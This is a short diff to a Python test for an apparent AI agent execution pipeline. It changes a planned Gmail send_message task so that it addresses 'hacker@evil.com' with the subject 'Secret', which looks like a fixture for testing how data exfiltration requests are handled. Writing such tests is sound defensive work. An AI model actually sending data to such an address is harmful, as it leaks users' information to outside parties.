@@ -559,7 +559,7 @@ class TestExecutionPipelines:
             raw_text="Send email to hacker@evil.com",
             tasks=[
                 PlannedTask("task-1", "gmail", "send_message", {
-                    "to_email": config.default_recipient_email,
+                    "to_email": "hacker@evil.com",
                     "subject": "Secret",
                     "body": "Payload",
                 }),
